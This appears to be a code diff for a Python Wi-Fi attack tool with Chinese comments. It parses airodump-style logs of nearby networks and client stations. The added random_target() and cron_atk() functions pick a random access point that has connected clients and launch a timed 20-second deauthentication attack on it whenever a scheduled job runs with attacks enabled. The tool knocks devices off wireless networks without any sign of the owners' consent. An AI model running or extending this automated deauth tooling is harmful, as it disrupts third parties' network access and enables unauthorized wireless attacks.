@@ -213,11 +213,13 @@ def data_station(station_lines):
     except Exception as e:
         print(e)
 
+
 #启动
 def start_airmon():
     LOGDIR = config.get_value('LOGDIR')
     LOGNAME = config.get_value('LOGNAME')
     LOG = "{}/{}-01.csv".format(LOGDIR,LOGNAME)
+
     try:
         subprocess.Popen([
             'rm',
@@ -273,47 +275,79 @@ def start_airmon():
         return False
 
 
-def cron_atk():
-    ATKFACE = config.get_value('ATKFACE')
+def random_target():
     LOGDIR = config.get_value('LOGDIR')
     LOGNAME = config.get_value('LOGNAME')
     LOG = "{}/{}-01.csv".format(LOGDIR, LOGNAME)
-    time1 = time.time()
 
     wifi_lines, station_lines = file_parse(LOG)
     new_wifi_list = get_wifi(wifi_lines)
+    station_list = get_station(station_lines)
+
+    channel_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 34, 36, 38,
+                    40, 42, 44, 46, 48,52, 56, 60, 64, 100, 104, 108, 112, 116, 120,
+                    124, 128, 132, 136, 140, 149,153, 157, 161, 165, 183, 184, 185, 187, 188, 189, 192, 196]
+
+    for count in range(0,10):
+        random_wifi = random.choice(new_wifi_list)
+        if random_wifi['essid'] is not None and random_wifi['privacy'] in ('OPN', None) \
+                and int(random_wifi['channel']) not in channel_list:
+            continue
+        elif not Wifilog.objects.filter(bssid=random_wifi['bssid']).exists():
+            continue
+
+        for station in station_list:
+            if station['bssid'] == random_wifi['bssid'] and station['essid'] is None:
+                return random_wifi
+
+    return None
+
+
+def cron_atk():
+
+    if not config.get_value('ATK_STATUS'):
+        return
+
+    ATKFACE = config.get_value('ATKFACE')
+
+    time1 = time.time()
 
     try:
-        random_wifi = random.choice(new_wifi_list)
-        if random_wifi['essid'] is None and random_wifi['privacy'] not in ('OPN', None) \
-                and random_wifi['channel'] in range(0, 200):
-            flag = Wifilog.objects.filter(random_wifi['bssid']).exists()
-            if flag:
-                bssid, channel = random_wifi['bssid'], random_wifi['channel']
-                pid = deauth(ATKFACE, bssid, channel)
-                return pid
-            else:
-                return False
+        random_wifi = random_target()
+
+        if random_wifi:
+            bssid, channel = random_wifi['bssid'], random_wifi['channel']
+            process = deauth(ATKFACE, bssid, channel)
+            time.sleep(20)
+            try:
+                process.kill()
+            except Exception as e:
+                print(e)
+            time2 = time.time()
+            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+            print(("{}:Attack").format(random_wifi['bssid']))
+            print('CronATK消耗:{}'.format(time2 - time1))
+        else:
+            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+            print("超时跳过")
     except Exception as e:
         print(e)
         return False
 
-    time2 = time.time()
-    print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
-    print('CronATK消耗:{}'.format(time2 - time1))
 
-
-def cron_log():
+def cron_data():
     LOGDIR = config.get_value('LOGDIR')
     LOGNAME = config.get_value('LOGNAME')
     LOG = "{}/{}-01.csv".format(LOGDIR, LOGNAME)
     time1 = time.time()
+    try:
+        wifi_lines, station_lines = file_parse(LOG)
+        data_wifi(wifi_lines)
+        data_station(station_lines)
 
-    wifi_lines, station_lines = file_parse(LOG)
-    data_wifi(wifi_lines)
-    data_station(station_lines)
-
-    time2 = time.time()
-    print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
-    print('CronLOG消耗:{}'.format(time2 - time1))
-
+        time2 = time.time()
+        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+        print('CronLOG消耗:{}'.format(time2 - time1))
+    except Exception as e:
+        print(e)
+        return
